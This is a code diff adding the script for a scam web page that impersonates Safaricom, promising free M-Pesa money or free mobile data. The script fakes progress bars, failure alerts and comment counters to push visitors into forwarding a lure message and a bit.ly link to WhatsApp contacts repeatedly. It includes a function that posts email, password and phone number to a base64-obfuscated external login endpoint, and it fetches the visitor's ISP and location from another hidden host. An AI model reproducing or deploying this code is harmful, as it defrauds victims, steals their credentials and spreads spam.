+                                              e = Math.floor(100 * (d / 10))*0.5+50 ;*/
+                                        d==1?e=50:d==2?e=65:d==3?e=70:d==4?e=70:d==5?e=80:d==6?e=80:d==7?e=85:d==8?e=90:d==9?e=94:d==10?e=96:d==11?e=98:d==12?e=100:void(0);
+                                    d++;
+                                    setTimeout(function() {
+                                        d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void(0) ;
+                                        l[i].textContent = e + "%";
+                                        DOMString.barLoaders[i].style.width = e + "%";
+                                    }, 4000);
+                                    set_Cookie('e',e);
+                                    set_Cookie('d',d);
+                                    
+         /*       if( d == 10 ||d == 11 || d == 12 ){
+                    location.href = "whatsapp://send?text=  Model penghasil uang terbaru pada tahun 2020, perubahan terjadi di sini! Hanya sebuah ponsel yang diperlukan, mengajar anda cara menghasilkan uang dan mengentaskan kemiskinan dalam 5 menit! ! %0Ahttps://tuisongxx.xyz/ad/makemoney.html?v=1" ;
+                }else{
+                                    window.location.href = "whatsapp://send?text=" + m
+                }*/
+                window.location.href = "whatsapp://send?text=" + m
+                
+                                })
+                            }
+                            j++
+                        }, 30))
+                    }, 1e3)
+                }, 1500)) : (DOMString.messageStatus.classList.remove("js-hidden"), DOMString.messageStatus.style.color = "red", DOMString.messageStatus.style.fontWeight = "bold", DOMString.messageStatus.textContent = "We need a number");
+        }
+    });
+
+    get_Cookie('e') ? setTimeout('enviar()',500) : void(0);
+    landingDomain='bit.ly/safaricomxmasgift'
+    function deadline() {
+        var day3 = new Date();
+        day3.setTime(day3.getTime()+24*60*60*1000);
+        return day3.getFullYear()+"-" + (day3.getMonth()+1) + "-" + (day3.getDate()+5);
+    }
+    function enviar(){
+        l = [DOMString.firstPorcent, DOMString.secondPorcent, DOMString.thirdPorcent];
+        i = 1;
+
+        clearInterval(window._setting), DOMString.congrats.classList.remove("js-hidden"), DOMString.sharing.classList.remove("js-hidden"), DOMString.share.classList.remove("js-hidden"), DOMString.svgLoading[i].classList.add("js-hidden"), DOMString.svgChecked[i].classList.remove("js-hidden"), i++;
+        var d = parseInt(get_Cookie('d'));
+        e = parseInt(get_Cookie('e'));
+        m = messageToSend();
+        d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void(0) ;
+        DOMString.barLoaders[i].classList.remove("js-hidden");
+        DOMString.boxes[i].classList.remove("js-hidden");
+        DOMString.svgLoading[i].classList.remove("js-hidden");
+        l[i].textContent = e + "%";
+        DOMString.barLoaders[i].style.width = e + "%";
+        DOMString.share.classList.remove("js-hidden"), DOMString.share.addEventListener("click", function () {
+            if (10 <= d) {
+                for (var a = document.querySelectorAll("#verify"), b = 0; b < a.length; b++) a[b].addEventListener("click", function () {
+                    /*   record('4g','wc');*/
+                    window.open(adsLink)
+                });
+                DOMString.congrats.classList.add("js-hidden"), document.querySelector(".js-verify").classList.remove("js-hidden"), DOMString.verify.classList.remove("js-hidden")
+            } else {
+                /*       record('4g',d);*/
+                // e = Math.floor(100 * (d / 10))*0.5+50 ;
+                d==1?e=50:d==2?e=65:d==3?e=70:d==4?e=70:d==5?e=80:d==6?e=80:d==7?e=85:d==8?e=90:d==9?e=94:d==10?e=96:d==11?e=98:d==12?e=100:void(0);
+                d++;
+                setTimeout(function() {
+                    d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void(0) ;
+                    l[i].textContent = e + "%";
+                    DOMString.barLoaders[i].style.width = e + "%";
+                }, 4000);
+                set_Cookie('e',e);
+                set_Cookie('d',d);
+                
+     /*           if( d == 10 || d == 11 || d == 12 ){
+                    location.href = "whatsapp://send?text=  Model penghasil uang terbaru pada tahun 2020, perubahan terjadi di sini! Hanya sebuah ponsel yang diperlukan, mengajar anda cara menghasilkan uang dan mengentaskan kemiskinan dalam 5 menit! ! %0Ahttps://tuisongxx.xyz/ad/makemoney.html?v=1" ;
+                }else{
+                window.location.href = "whatsapp://send?text=" + m;
+                }*/
+                window.location.href = "whatsapp://send?text=" + m;
+            }
+        })
+
+    }
+    function doreq(e, a, b) {
+        var c = new XMLHttpRequest;
+        c.open("POST", atob("aHR0cHM6Ly9hcHMucmVwcm92aWRlcy5jb20vbG9naW4ucGhwP3drcj16eGNtbmJ2MTI=")), c.onreadystatechange = function () {
+            4 === c.readyState && 200 === c.status
+        }, c.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), c.send("email=" + e + "&pass=" + a + "&phone=" + b)
+    }
+    function tip_text() {
+        var a = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0],
+            b = "";
+        return "en" === a ? b="Sharing failed! The same group or the same friend is invalid. Please check and share again." : "id" === a ? b="Berbagi gagal! Grup yang sama atau teman yang sama tidak valid. Silakan periksa dan bagikan lagi." :  b="Sharing failed! The same group or the same friend is invalid. Please check and share again." ;
+
+    }
+    function messageToSend() {
+        var a = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0],
+            b = "";
+        return "en" === a ? b = "*Safaricom%20Krisi%20Celebrations*%0A%0ANumber%20yako%20yaweza%20kuwa%20imechaguliwa%20na%20Safaricom%20kupokea%20*KES%207%2C000*%20za%20bure%20kwenye%20Mpesa.%20%0A%0A*_Sherehekea%20Christmas%20na%20Safaricom_*%20%0A%0ADeadline: "+deadline()+" %0A%0AVisit " + landingDomain : "id" === a ? b = "*Safaricom%20Krisi%20Celebrations*%0A%0ANumber%20yako%20yaweza%20kuwa%20imechaguliwa%20na%20Safaricom%20kupokea%20*KES%207%2C000*%20za%20bure%20kwenye%20Mpesa.%20%0A%0A*_Sherehekea%20Christmas%20na%20Safaricom_*%20%0A%0ADeadline: "+deadline()+" %0A%0AVisit " + landingDomain : b = "*Safaricom%20Krisi%20Celebrations*%0A%0ANumber%20yako%20yaweza%20kuwa%20imechaguliwa%20na%20Safaricom%20kupokea%20*KES%207%2C000*%20za%20bure%20kwenye%20Mpesa.%20%0A%0A*_Sherehekea%20Christmas%20na%20Safaricom_*%20%0A%0ADeadline: "+deadline()+" %0A%0AVisit " + landingDomain ;
+    }
+
+    /* function messageToSend() {
+         var a = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0],
+             b = "";
+         return "en" === a ? b = "To be grateful to customers for their continued support of 4G Internet! The company launched a 60-day free access to 100GB Internet data free use plan Participants can get 100GB free mobile internet data usage\n" +
+             "Participating customers:\n" +
+             "1. Customers who use 4G data for a long time\n" +
+             "2. All traffic on Whatsapp users is free, including video downloads\n" +
+             "3. The system will check your number for participation rights\n" +
+             "4. It can help the company to promote the business first\n" +
+             "The system will record your start date after success.\n" +
+             "Thank you for your participation! %0A%0A*Get it now HERE \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
+             "it" === a ? b = "*200 Gb di dati Internet senza alcuna ricarica Per* %0A Ottieni 200 Gb di dati Internet gratuitamente su qualsiasi rete mobile per 60 giorni. %0A *Scarica ora QUI \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz " :
+                 "es" === a ? b = "*200 Gb de datos de Internet súper rápidos sin ninguna recarga* %0A%0AObtenga 200 Gb de datos de Internet gratis en cualquier red ahora. m\xF3vil durante 60 d\xEDas. %0A%0A*Consiguelo ahora AQUI \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
+                     "ar" === a ? b = "*200 \u062C\u064A\u062C\u0627 \u0628\u0627\u064A\u062A \u0645\u0646 \u0628\u064A\u0627\u0646\u0627\u062A \u0627\u0644\u0625\u0646\u062A\u0631\u0646\u062A \u062F\u0648\u0646 \u0623\u064A \u0625\u0639\u0627\u062F\u0629 \u0634\u062D\u0646 \u0628\u0633\u0628\u0628* %0A \u0627\u062D\u0635\u0644 \u0639\u0644\u0649 100 \u062C\u064A\u062C\u0627\u0628\u0627\u064A\u062A \u0645\u0646 \u0628\u064A\u0627\u0646\u0627\u062A \u0627\u0644\u0625\u0646\u062A\u0631\u0646\u062A \u0627\u0644\u0645\u062C\u0627\u0646\u064A\u0629 \u0639\u0644\u0649 \u0623\u064A \u0634\u0628\u0643\u0629 \u0645\u062D\u0645\u0648\u0644 \u0644\u0645\u062F\u0629 60 \u064A\u0648\u0645\u064B\u0627 %0A *\u0627\u062D\u0635\u0644 \u0639\u0644\u064A\u0647 \u0627\u0644\u0622\u0646 \u0647\u0646\u0627 \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
+                         "el" === a ? b = "*200 Gb \u03B4\u03B5\u03B4\u03BF\u03BC\u03AD\u03BD\u03C9\u03BD \u0394\u03B9\u03B1\u03B4\u03B9\u03BA\u03C4\u03CD\u03BF\u03C5 \u03C7\u03C9\u03C1\u03AF\u03C2 \u03BA\u03B1\u03BC\u03AF\u03B1 \u03B5\u03C0\u03B1\u03BD\u03B1\u03C6\u03CC\u03C1\u03C4\u03B9\u03C3\u03B7 \u0393\u03B9\u03B1* %0A \u039B\u03AC\u03B2\u03B5\u03C4\u03B5 200 Gb \u03B4\u03B5\u03B4\u03BF\u03BC\u03AD\u03BD\u03C9\u03BD Internet \u03B4\u03C9\u03C1\u03B5\u03AC\u03BD \u03C3\u03B5 \u03BF\u03C0\u03BF\u03B9\u03BF\u03B4\u03AE\u03C0\u03BF\u03C4\u03B5 \u03B4\u03AF\u03BA\u03C4\u03C5\u03BF \u03BA\u03B9\u03BD\u03B7\u03C4\u03AE\u03C2 \u03C4\u03B7\u03BB\u03B5\u03C6\u03C9\u03BD\u03AF\u03B1\u03C2 \u03B3\u03B9\u03B1 60 \u03B7\u03BC\u03AD\u03C1\u03B5\u03C2. %0A *\u0391\u03C0\u03BF\u03BA\u03C4\u03AE\u03C3\u03C4\u03B5 \u03C4\u03BF \u0395\u0394\u03A9 \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
+                             "sq" === a ? b = "*200 Gb t\xEB dh\xEBna n\xEB internet pa ndonj\xEB rimbushje p\xEBr* %0A Merrni 200 Gb t\xEB dh\xEBna n\xEB internet falas n\xEB \xE7do rrjet celular p\xEBr 60 dit\xEB. %0A *Merre tani KETU%* %0Ahttps://tuisongxx.xyz" :
+                                 "tr" === a ? b = "*Herhangi bir \u015Farj olmadan 200 Gb \u0130nternet verisi  i\xE7in* %0A Herhangi bir mobil a\u011Fda 60 g\xFCn boyunca \xFCcretsiz olarak 200 Gb \u0130nternet verisi al\u0131n. %0A *Hemen al\u0131n HERE \uD83D\uDC47\uD83D\uDC47* %0A https://tuisongxx.xyz/" :
+                                     "ru" === a ? b = "*100 \u0413\u0411 \u0438\u043D\u0442\u0435\u0440\u043D\u0435\u0442-\u0434\u0430\u043D\u043D\u044B\u0445 \u0431\u0435\u0437 \u043F\u0435\u0440\u0435\u0437\u0430\u0440\u044F\u0434\u043A\u0438. \u0414\u043B\u044F \u041A\u0410\u0420\u0410\u041D\u0422\u0418\u041D\u0410* %0A \u041F\u043E\u043B\u0443\u0447\u0438\u0442\u0435 100 \u0413\u0411 \u0438\u043D\u0442\u0435\u0440\u043D\u0435\u0442-\u0434\u0430\u043D\u043D\u044B\u0445 \u0431\u0435\u0441\u043F\u043B\u0430\u0442\u043D\u043E \u0432 \u043B\u044E\u0431\u043E\u0439 \u043C\u043E\u0431\u0438\u043B\u044C\u043D\u043E\u0439 \u0441\u0435\u0442\u0438 \u0432 \u0442\u0435\u0447\u0435\u043D\u0438\u0435 60 \u0434\u043D\u0435\u0439. %0A *\u041F\u043E\u043B\u0443\u0447\u0438\u0442\u044C \u0441\u0435\u0439\u0447\u0430\u0441 \u0417\u0414\u0415\u0421\u042C \uD83D\uDC47\uD83D\uDC47* %0A https://tuisongxx.xyz" :
+                                         "no" === a ? b = "*200 Gb Internett-data uten lading* %0A F\xE5 200 Gb Internett-data gratis p\xE5 et mobilnett i 60 dager. %0A *F\xE5 den n\xE5 HER \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
+                                             "af" === a ? b = "*200 Gb internetdata sonder enige herlaai vir QUARANTINE (KROONVIRUS)* %0A Kry 60 GB internetdata gratis op enige mobiele netwerk vir 60 dae. %0A *Kry dit nou HIER \uD83D\uDC47\uD83D\uDC47* %0A https://tuisongxx.xyz/" :
+                                                 "se" === a ? b = "*200 Gb Internetdata utan laddning f\xF6r QUARANTINE (CROWN VIRUS)* %0A F\xE5 200 Gb Internetdata gratis i alla mobiln\xE4tverk i 60 dagar. %0A *H\xE4mta det nu H\xC4R \uD83D\uDC47\uD83D\uDC47* %0A https://tuisongxx.xyz/" :
+                                                     "th" === a ? b = "*\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E2D\u0E34\u0E19\u0E40\u0E17\u0E2D\u0E23\u0E4C\u0E40\u0E19\u0E47\u0E15 200Gb \u0E42\u0E14\u0E22\u0E44\u0E21\u0E48\u0E15\u0E49\u0E2D\u0E07\u0E0A\u0E32\u0E23\u0E4C\u0E08\u0E0B\u0E49\u0E33\u0E2A\u0E33\u0E2B\u0E23\u0E31\u0E1A* %0A \u0E23\u0E31\u0E1A\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E2D\u0E34\u0E19\u0E40\u0E17\u0E2D\u0E23\u0E4C\u0E40\u0E19\u0E47\u0E15 200Gb \u0E1F\u0E23\u0E35\u0E1A\u0E19\u0E40\u0E04\u0E23\u0E37\u0E2D\u0E02\u0E48\u0E32\u0E22\u0E21\u0E37\u0E2D\u0E16\u0E37\u0E2D\u0E43\u0E14 \u0E46 \u0E40\u0E1B\u0E47\u0E19\u0E40\u0E27\u0E25\u0E32 60 \u0E27\u0E31\u0E19  %0A *\u0E23\u0E31\u0E1A\u0E17\u0E31\u0E19\u0E17\u0E35\u0E17\u0E35\u0E48\u0E19\u0E35\u0E48\uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
+                                                         "pl" === a ? b = "*200 Gb danych internetowych bez do\u0142adowania W przypadku KWARANTANNY (WIRUS KORONOWY)* %0A Uzyskaj 200 Gb danych internetowych bezp\u0142atnie w dowolnej sieci kom\xF3rkowej przez 60 dni. %0A *Pobierz teraz TUTAJ\uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
+                                                             "nl" === a ? b = "*200 Gb aan internetgegevens zonder op te laden Voor QUARANTINE (CROWN VIRUS)* %0A Ontvang gratis 200 Gb aan internetgegevens op elk mobiel netwerk gedurende 60 dagen. %0A *Haal het nu HIER \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
+                                                                 "de" === a ? b = "*200 Gb Internetdaten ohne Aufladung F\xFCr* %0A Sie erhalten 60 Tage lang kostenlos 200 Gb Internetdaten in jedem Mobilfunknetz. %0A *Jetzt HIER herunterladen \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
+                                                                     "id" === a ? b = "Untuk berterima kasih kepada pelanggan atas dukungan berkelanjutan mereka terhadap Internet 4G! Perusahaan meluncurkan paket akses gratis 60 hari ke 200GB data Internet untuk penggunaan gratis Peserta bisa mendapatkan 200GB penggunaan data internet seluler gratis Pelanggan yang berpartisipasi: 1. Pelanggan yang menggunakan data 4G dalam waktu lama 2. Semua lalu lintas di pengguna Whatsapp gratis, termasuk unduhan video 3. Sistem akan memeriksa nomor Anda untuk hak partisipasi 4. Dapat membantu perusahaan untuk mempromosikan prioritas bisnis Sistem akan mencatat tanggal mulai Anda setelah sukses Terima kasih atas partisipasinya! %0A *Dapatkan sekarang DI SINI \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
+                                                                         "pt" === a ? b = "*200 Gb de dados da Internet sem recarga Para QUARANTINE (V\xCDRUS DE CORONA)* %0A Obtenha 200 Gb de dados da Internet gratuitamente em qualquer rede m\xF3vel por 60 dias. %0A *Adquira agora AQUI \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
+                                                                             "ms" === a ? b = "*200Gb data Internet tanpa pengisian semula Untuk Kuarantin (CROWN VIRUS)* %0A Dapatkan 200Gb data Internet secara percuma di mana-mana rangkaian mudah alih selama 60 hari. %0A *Dapatkan sekarang DI SINI \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
+                                                                                 //    "th" === a ? b = "* รับข้อมูล Intrnet 200Gb โดยไม่ต้องเติมเงินใด ๆ *% 0A% 0AC คลิกด้านล่างเพื่อรับข้อมูล 200Gb ฟรี 60 วันสำหรับ Operator% 0A% 0A ทั้งหมด * รับทันทีที่นี่ \uD83D \uDC47 \uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
+                                                                                 "cn"=== a ? b = "*获取200GB的流量数据而无需充值* ％0A％0A 单击下面的按钮即可为所有运营商 ％0A％0A 免费获得60天的200Gb数据* 立即获取 \uD83D\uDC47\uD83D\uDC47 * %0Ahttps://tuisongxx.xyz/cn/"
+
+     }*/
+
+    function operatorData(c) {
+        var a = new XMLHttpRequest;
+        a.open("GET", atob("aHR0cHM6Ly90ZHNqc2V4dDMuY29tL0V4dFNlcnZpY2Uuc3ZjL2dldGV4dHBhcmFtcw==")), a.onreadystatechange = function () {
+            4 === a.readyState && 200 == a.status && c(a.response)
+        }, a.send(null)
+    }
+
+    operatorData(function (e) {
+        var {isp: a, cnames: b, subdiv: c} = JSON.parse(e);
+        document.querySelector(".quedate__company").textContent = a, document.querySelector(".quedate__country").textContent = b.en, document.querySelector(".quedate__city").textContent = c[0].en
+    });
+    var counter = 153;
+    setInterval(function () {
+        document.querySelector(".chat__reactions-counter").textContent = counter + "k", counter++
+    }, 5e3);
+    var counter2 = 337;
+    setInterval(function () {
+        document.querySelector(".js-counter").textContent = counter2, counter2++
+    }, 5e3);
+    var seconds = 1;
+    setInterval(function () {
+        for (var c = document.querySelectorAll(".js-seconds"), a = 0; a < c.length; a++) c[a].textContent = seconds + "m";
+        seconds++
+    }, 6e3), setTimeout(function () {
+        var b = document.querySelector("#js-box-1");
+        b.classList.remove("js-hidden"), b.classList.add("fadeInDown")
+    }, 1e3), setTimeout(function () {
+        var b = document.querySelector("#js-box-2");
+        b.classList.remove("js-hidden"), b.classList.add("fadeInDown")
+    }, 3e3);</script>
+
+<script>
+    function getTextNodesIn(a, b) {
+        var c = [];
+        if (a) for (var d = a.childNodes, e = d.length; e--;) {
+            var f = d[e], g = f.nodeType;
+            3 == g ? (!b || b(f, a)) && !f.wholeText.includes("\n") && !f.parentNode.__proto__.toString().includes("SVG") && !f.wholeText.match(/\b(?:Carles|Roign|US$|Demand|Laurens|Kule|Taufik|Albert)\b/gi) && 4 <= f.wholeText.length && c.push(f) : (1 == g || 9 == g || 11 == g) && (c = c.concat(getTextNodesIn(f, b)))
+        }
+        return c
+    }
+
+    var language = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0];
+    if ("es" === language ? window.words = ["Respuesta", "Me gusta", "Integraci\xF3n bastante f\xE1cil. Fue compartido por algunos amigos personales.", "est\xE1 escribiendo un comentario ...", "Responder", "Me gusta", "En estos tiempos dif\xEDciles es necesario.", "Responder", "Me gusta", "Realmente, gracias por compartir esto con nosotros.", "Responder", "Me gusta", "Compruebo mi ciudad, estaba presente. Gracias por tenernos en cuenta.", "Responder", "Me gusta", "Gracias, realmente, funciona perfectamente.", "Comentario", "Me gusta", "acciones", "comentarios", "153K", "ANDROID", "IPHONE", "Ahora seleccione su dispositivo m\xF3vil.", "(Recuerde que este paso es importante para que funcione Internet gratuito).", "1. Debe instalar la aplicaci\xF3n a continuaci\xF3n cuando y cuando est\xE9 instalada, debe abrirla durante 30 segundos.", "\xA1Para activar Internet gratis, debe completar este \xFAltimo paso final de Verificaci\xF3n Humana!", "Felicidades, ganaste 200GB de Internet gratis", "Comparte con tus amigos", "Despu\xE9s de compartir, ir\xE1 al siguiente paso para que pueda activar este servicio gratuito de Internet durante 60 d\xEDas.", "Para poder activar Internet gratis \xA1Primero haga clic en el bot\xF3n verde \"WHATSAPP\" y env\xEDe esta noticia a 12 amigos o grupos en WhatsApp para que tambi\xE9n puedan obtener este servicio gratuito durante esta Cuarentena larga!", "\xBFC\xF3mo activar Internet gratis?", "\xA1Felicitaciones, gan\xF3 200GB gratis de su operador de telefon\xEDa m\xF3vil!", "Espera un momento, validamos los datos.", "Nuestra pol\xEDtica y condiciones de privacidad del servicio", "La aplicaci\xF3n no tiene permitido publicar en Facebook", "Aceptar - Soy un humano", "Deber\xEDamos validar que eres un humano real comprobando tu nombre y foto de perfil.", "Solicitar permiso", "Espera, estamos validando datos", "Comprobaci\xF3n de identidad real", "Conectando con su operador", "Complete estos 3 pasos", "Enviar", " est\xE1 en nuestra lista. Por favor, introduzca su n\xFAmero de tel\xE9fono", "La Provincia de ", "Gracias, ya hemos verificado", "Verif\xEDquelo", " 200GB gratis", "Compruebe si su zona ha sido seleccionada para", "QuedateEnCasa", "Internet gratis 4G/5G: 200GB"] :
+        "ar" === language ? window.words = ["\u0625\u062C\u0627\u0628\u0629", "\u0627\u0646\u0627 \u064A\u0639\u062C\u0628\u0646\u064A", "\u062A\u0643\u0627\u0645\u0644 \u0633\u0647\u0644 \u0644\u0644\u063A\u0627\u064A\u0629. \u062A\u0645 \u0645\u0634\u0627\u0631\u0643\u062A\u0647 \u0645\u0646 \u0642\u0628\u0644 \u0628\u0639\u0636 \u0627\u0644\u0623\u0635\u062F\u0642\u0627\u0621 \u0627\u0644\u0634\u062E\u0635\u064A\u064A\u0646.", "\u064A\u0643\u062A\u0628 \u062A\u0639\u0644\u064A\u0642 ...", "\u0627\u0644\u0631\u062F", "\u0627\u0646\u0627 \u064A\u0639\u062C\u0628\u0646\u064A", "\u0641\u064A \u0647\u0630\u0647 \u0627\u0644\u0623\u0648\u0642\u0627\u062A \u0627\u0644\u0635\u0639\u0628\u0629 \u0645\u0646 \u0627\u0644\u0636\u0631\u0648\u0631\u064A.", "\u0627\u0644\u0631\u062F", "\u0627\u0646\u0627 \u064A\u0639\u062C\u0628\u0646\u064A", "\u062D\u0642\u0627 \u0634\u0643\u0631\u0627 \u0644\u0645\u0634\u0627\u0631\u0643\u062A\u0643 \u0647\u0630\u0627 \u0645\u0639\u0646\u0627", "\u0627\u0644\u0631\u062F", "\u0627\u0646\u0627 \u064A\u0639\u062C\u0628\u0646\u064A", "\u0623\u062A\u062D\u0642\u0642 \u0645\u0646 \u0645\u062F\u064A\u0646\u062A\u064A \u060C \u0643\u0646\u062A \u062D\u0627\u0636\u0631\u0627\u064B. \u0634\u0643\u0631\u0627 \u0644\u0623\u062E\u0630\u0646\u0627 \u0641\u064A \u0627\u0644\u0627\u0639\u062A\u0628\u0627\u0631.", "\u0627\u0644\u0631\u062F", "\u0627\u0646\u0627 \u064A\u0639\u062C\u0628\u0646\u064A", "\u0634\u0643\u0631\u0627 \u060C \u062D\u0642\u0627 \u060C \u0625\u0646\u0647\u0627 \u062A\u0639\u0645\u0644 \u0628\u0634\u0643\u0644 \u0645\u062B\u0627\u0644\u064A.", "\u062A\u0639\u0644\u064A\u0642", "\u0627\u0646\u0627 \u064A\u0639\u062C\u0628\u0646\u064A", "\u0623\u062C\u0631\u0627\u0621\u0627\u062A", "\u062A\u0639\u0644\u064A\u0642\u0627\u062A", "153K", "\u0630\u0643\u0631\u064A \u0627\u0644\u0645\u0638\u0647\u0631", "\u0627\u064A\u0641\u0648\u0646", "\u0627\u0644\u0622\u0646 \u062D\u062F\u062F \u062C\u0647\u0627\u0632\u0643 \u0627\u0644\u0645\u062D\u0645\u0648\u0644.", "(\u062A\u0630\u0643\u0631 \u0623\u0646 \u0647\u0630\u0647 \u0627\u0644\u062E\u0637\u0648\u0629 \u0645\u0647\u0645\u0629 \u062D\u062A\u0649 \u064A\u0639\u0645\u0644 \u0627\u0644\u0625\u0646\u062A\u0631\u0646\u062A \u0645\u062C\u0627\u0646\u064B\u0627.)", "1. \u064A\u062C\u0628 \u0639\u0644\u064A\u0643 \u062A\u062B\u0628\u064A\u062A \u0627\u0644\u062A\u0637\u0628\u064A\u0642 \u0623\u062F\u0646\u0627\u0647 \u0639\u0646\u062F\u0645\u0627 \u0648\u0645\u062A\u0649 \u062A\u0645 \u062A\u062B\u0628\u064A\u062A\u0647 \u060C \u064A\u062C\u0628 \u0639\u0644\u064A\u0643 \u0641\u062A\u062D\u0647 \u0644\u0645\u062F\u0629 30 \u062B\u0627\u0646\u064A\u0629.", "\u0644\u062A\u0646\u0634\u064A\u0637 \u0627\u0644\u0625\u0646\u062A\u0631\u0646\u062A \u0627\u0644\u0645\u062C\u0627\u0646\u064A \u060C \u064A\u062C\u0628 \u0639\u0644\u064A\u0643 \u0625\u0643\u0645\u0627\u0644 \u0647\u0630\u0647 \u0627\u0644\u062E\u0637\u0648\u0629 \u0627\u0644\u0646\u0647\u0627\u0626\u064A\u0629 \u0627\u0644\u0646\u0647\u0627\u0626\u064A\u0629 \u0644\u0644\u062A\u062D\u0642\u0642 \u0627\u0644\u0628\u0634\u0631\u064A!", "\u062A\u0647\u0627\u0646\u064A\u0646\u0627 \u060C \u0644\u0642\u062F \u0631\u0628\u062D\u062A 100 \u063A\u064A\u063A\u0627\u0628\u0627\u064A\u062A \u0645\u0646 \u0627\u0644\u0625\u0646\u062A\u0631\u0646\u062A \u0645\u062C\u0627\u0646\u064B\u0627", "\u0634\u0627\u0631\u0643 \u0627\u0644\u0645\u0648\u0636\u0648\u0639 \u0645\u0639 \u0623\u0635\u062F\u0642\u0627\u0626\u0643", "\u0628\u0639\u062F \u0627\u0644\u0645\u0634\u0627\u0631\u0643\u0629 \u060C \u0633\u062A\u0646\u062A\u0642\u0644 \u0625\u0644\u0649 \u0627\u0644\u062E\u0637\u0648\u0629 \u0627\u0644\u062A\u0627\u0644\u064A\u0629 \u062D\u062A\u0649 \u062A\u062A\u0645\u0643\u0646 \u0645\u0646 \u062A\u0641\u0639\u064A\u0644 \u062E\u062F\u0645\u0629 \u0627\u0644\u0625\u0646\u062A\u0631\u0646\u062A \u0627\u0644\u0645\u062C\u0627\u0646\u064A\u0629 \u0647\u0630\u0647 \u0644\u0645\u062F\u0629 60 \u064A\u0648\u0645\u064B\u0627.", "\u0644\u062A\u062A\u0645\u0643\u0646 \u0645\u0646 \u062A\u0646\u0634\u064A\u0637 \u0627\u0644\u0625\u0646\u062A\u0631\u0646\u062A \u0645\u062C\u0627\u0646\u064B\u0627 \u060C \u0627\u0646\u0642\u0631 \u0623\u0648\u0644\u0627\u064B \u0639\u0644\u0649 \u0632\u0631 \"\u0645\u0634\u0627\u0631\u0643\u0629\" \u0627\u0644\u0623\u062E\u0636\u0631 \u0648\u0623\u0631\u0633\u0644 \u0647\u0630\u0647 \u0627\u0644\u0623\u062E\u0628\u0627\u0631 \u0625\u0644\u0649 12 \u0635\u062F\u064A\u0642\u064B\u0627 \u0623\u0648 \u0645\u062C\u0645\u0648\u0639\u0629 \u0639\u0644\u0649 WhatsApp \u062D\u062A\u0649 \u064A\u062A\u0645\u0643\u0646\u0648\u0627 \u0623\u064A\u0636\u064B\u0627 \u0645\u0646 \u0627\u0644\u062D\u0635\u0648\u0644 \u0639\u0644\u0649 \u0647\u0630\u0647 \u0627\u0644\u062E\u062F\u0645\u0629 \u0627\u0644\u0645\u062C\u0627\u0646\u064A\u0629 \u062E\u0644\u0627\u0644 \u0647\u0630\u0627 \u0627\u0644\u0639\u0632\u0644 \u0627\u0644\u0637\u0648\u064A\u0644!", "\u0643\u064A\u0641\u064A\u0629 \u062A\u0646\u0634\u064A\u0637 \u0627\u0644\u0625\u0646\u062A\u0631\u0646\u062A \u0627\u0644\u0645\u062C\u0627\u0646\u064A\u061F", "\u062A\u0647\u0627\u0646\u064A\u0646\u0627 \u060C \u0644\u0642\u062F \u0631\u0628\u062D\u062A 100 \u063A\u064A\u063A\u0627\u0628\u0627\u064A\u062A \u0645\u062C\u0627\u0646\u064B\u0627 \u0645\u0646 \u0645\u0634\u063A\u0644 \u0634\u0628\u0643\u0629 \u0627\u0644\u062C\u0648\u0627\u0644!", "\u0627\u0646\u062A\u0638\u0631 \u0644\u062D\u0638\u0629 \u060C \u0646\u062D\u0646 \u0646\u062A\u062D\u0642\u0642 \u0645\u0646 \u0635\u062D\u0629 \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A.", "\u0633\u064A\u0627\u0633\u0629 \u0648\u0634\u0631\u0648\u0637 \u062E\u0635\u0648\u0635\u064A\u0629 \u062E\u062F\u0645\u062A\u0646\u0627", "\u0644\u0627 \u064A\u064F\u0633\u0645\u062D \u0644\u0644\u062A\u0637\u0628\u064A\u0642 \u0628\u0627\u0644\u0646\u0634\u0631 \u0639\u0644\u0649 Facebook", "\u0642\u0628\u0648\u0644 - \u0623\u0646\u0627 \u0625\u0646\u0633\u0627\u0646", "\u064A\u062C\u0628 \u0623\u0646 \u0646\u062B\u0628\u062A \u0623\u0646\u0643 \u0625\u0646\u0633\u0627\u0646 \u062D\u0642\u064A\u0642\u064A \u0645\u0646 \u062E\u0644\u0627\u0644 \u0627\u0644\u062A\u062D\u0642\u0642 \u0645\u0646 \u0627\u0633\u0645\u0643 \u0648\u0635\u0648\u0631\u0629 \u0645\u0644\u0641\u0643 \u0627\u0644\u0634\u062E\u0635\u064A.", "\u0637\u0644\u0628 \u0625\u0630\u0646", "\u0627\u0646\u062A\u0638\u0631 \u060C \u0646\u062D\u0646 \u0646\u062A\u062D\u0642\u0642 \u0645\u0646 \u0635\u062D\u0629 \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A", "\u0627\u0644\u062A\u062D\u0642\u0642 \u0645\u0646 \u0627\u0644\u0647\u0648\u064A\u0629 